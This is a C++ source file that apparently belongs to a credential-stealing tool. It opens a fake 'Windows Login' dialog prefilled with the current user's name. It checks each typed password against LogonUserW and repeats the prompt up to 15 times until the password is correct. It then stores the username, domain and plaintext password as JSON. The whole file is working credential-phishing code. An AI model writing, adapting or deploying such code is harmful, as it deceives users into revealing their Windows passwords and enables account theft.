#include "Credentials.h"
#include <CommCtrl.h>

void Tool::Credentials::ConvertResults(std::wstring wUserName, std::wstring wPassword, std::wstring wUserDomain, awesomejson::json& jLoginCredentials) {
    std::string sUsername(wUserName.begin(), wUserName.end());
    std::string sPassword(wPassword.begin(), wPassword.end());
    std::string sDomain(wUserDomain.begin(), wUserDomain.end());
    this->sGatheredCreds += STR("\"username\": \"") + sUsername + STR("\", \"domain\": \"") + sDomain + STR("\", \"password\": \"") + sPassword + STR("\" }}");
    jLoginCredentials = awesomejson::json::parse(this->sGatheredCreds);
}

void Tool::Credentials::GatherLoginCredentials(awesomejson::json& jLoginCredentials) {

    CREDUI_INFO ci;
    LVITEM lvi;
    std::wstring wUserName = L"", wPassword = L"", wUserDomain = L"";
    Tool::SystemInfo::GetUserDomain(wUserDomain);
    Tool::SystemInfo::GetCurrentUserName(wUserName);
    lvi.pszText = &wUserName[0];
    TCHAR psPwd[CREDUI_MAX_PASSWORD_LENGTH + 1];
    SecureZeroMemory(psPwd, sizeof(psPwd));
    ci.cbSize = sizeof(CREDUI_INFO);
    ci.hwndParent = NULL;
    ci.pszMessageText = L"Enter account information";
    ci.pszCaptionText = L"Windows Login";
    ci.hbmBanner = NULL;

    while (this->iCounter != 15) {
        HANDLE hToken = NULL;
        CredUIPromptForCredentialsW(
            &ci,
            L"Windows Login",
            NULL,
            0,
            lvi.pszText,
            CREDUI_MAX_USERNAME_LENGTH + 1,
            psPwd,
            CREDUI_MAX_PASSWORD_LENGTH + 1,
            FALSE,
            CREDUI_FLAGS_GENERIC_CREDENTIALS |
            CREDUI_FLAGS_ALWAYS_SHOW_UI |
            CREDUI_FLAGS_DO_NOT_PERSIST);

        // Validate user credentials
        wPassword = psPwd;
        if (LogonUserW(wUserName.c_str(),
            wUserName.c_str(),
            wPassword.c_str(),
            LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT,
            &hToken)) {
            break;
        }
        this->iCounter += 1;
        //Zero out password buffer and revalue username default
        ci.pszMessageText = L"Wrong login information, please try again";
        lvi.pszText = &wUserName[0];
        SecureZeroMemory(psPwd, sizeof(psPwd));
    }
    this->ConvertResults(wUserName, wPassword, wUserDomain, jLoginCredentials);
}